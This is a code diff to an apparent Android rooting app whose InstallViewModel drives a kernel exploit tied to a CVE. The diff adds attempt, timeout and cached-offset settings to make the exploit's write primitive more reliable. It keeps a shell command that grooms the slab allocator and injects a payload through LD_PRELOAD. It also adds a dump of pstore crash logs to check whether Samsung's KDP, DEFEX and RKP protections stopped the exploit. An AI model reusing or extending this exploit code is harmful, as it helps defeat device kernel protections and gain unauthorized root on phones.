@@ -182,6 +182,8 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
     private suspend fun executeExploit(payload: File) {
         val shizuku = shizukuEnabled()
         appendLog("[diag] shizukuEnabled=$shizuku isRunning=${ShizukuController.isRunning()} isGranted=${ShizukuController.isGranted()}")
+        // v0.2.34: pstore dump —— 重启后读上次内核崩溃日志（KDP/DEFEX/RKP 拦截铁证）
+        if (shizuku) dumpPstore()
         val logFile = if (shizuku) File(SHIZUKU_LOG_PATH) else File(app.filesDir, "exploit.log")
         if (shizuku) {
             ShizukuController.exec(arrayOf("rm", "-f", SHIZUKU_LOG_PATH)).waitFor()
@@ -202,13 +204,20 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
             //   1) WARMUP 400x /system/bin/true（调整 slab 分配器状态，让 ashmem 对象落在可利用页）
             //   2) 仅 3 个环境变量（无 PSELECT_DELAY_USEC）
             //   3) CVE43499_ROOT_HELPER=... EXPLOIT_ATTEMPTS=N LD_PRELOAD=... /system/bin/true
+            // v0.2.34: Shizuku 分支补 P0_ATTEMPT_TIMEOUT_SEC + P0_OFFSET（对齐 App 分支，提高写原语可靠性）
+            val shizukuEnv = buildList {
+                add("CVE43499_ROOT_HELPER=${helper.absolutePath}")
+                add("EXPLOIT_ATTEMPTS=$EXPLOIT_ATTEMPTS")
+                add("P0_ATTEMPT_TIMEOUT_SEC=$P0_ATTEMPT_TIMEOUT_SEC")
+                cachedP0Offset(bootToken)?.let { add("$P0_OFFSET_ENV=$it") }
+            }.toTypedArray()
             ShizukuController.exec(
                 arrayOf(
                     "/system/bin/sh",
                     "-c",
-                    "i=0; while [ ${'$'}i -lt 400 ]; do /system/bin/true; i=$((i+1)); done; CVE43499_ROOT_HELPER=${shellQuote(helper.absolutePath)} EXPLOIT_ATTEMPTS=$EXPLOIT_ATTEMPTS LD_PRELOAD=${shellQuote(stagedPayload.absolutePath)} /system/bin/true 2>&1",
+                    "i=0; while [ ${'$'}i -lt 400 ]; do /system/bin/true; i=$((i+1)); done; CVE43499_ROOT_HELPER=${shellQuote(helper.absolutePath)} LD_PRELOAD=${shellQuote(stagedPayload.absolutePath)} /system/bin/true 2>&1",
                 ),
-                emptyArray(),
+                shizukuEnv,
             )
         } else {
             appendLog("[diag] App branch: payload=${payload.absolutePath}")
@@ -384,6 +393,22 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
             .putString(P0_CACHE_BOOT_TOKEN, bootToken)
             .putString(P0_CACHE_OFFSET, value)
             .apply()
+    }
+
+    /**
+     * v0.2.34: dump 上次内核崩溃日志（pstore）——exploit 重启后 KDP/DEFEX/RKP 是否拦截的铁证。
+     * 三星 pstore 在 /sys/fs/pstore/ 保存 last_kmsg/dmesg；shell 域可读。
+     */
+    private fun dumpPstore() {
+        try {
+            appendLog("--- [pstore] dump start ---")
+            val out = ShizukuController.capture(arrayOf("sh", "-c",
+                "for f in /sys/fs/pstore/*; do echo \"===== ${'$'}f =====\"; head -c 8192 \"${'$'}f\" 2>/dev/null; echo; done; ls -la /sys/fs/pstore/ 2>/dev/null"))
+            if (out.isNotBlank()) appendLog(out) else appendLog("--- [pstore] empty ---")
+            appendLog("--- [pstore] dump end ---")
+        } catch (t: Throwable) {
+            appendLog("--- [pstore] error: ${t.message} ---")
+        }
     }
 
     private fun helperFile(): File =
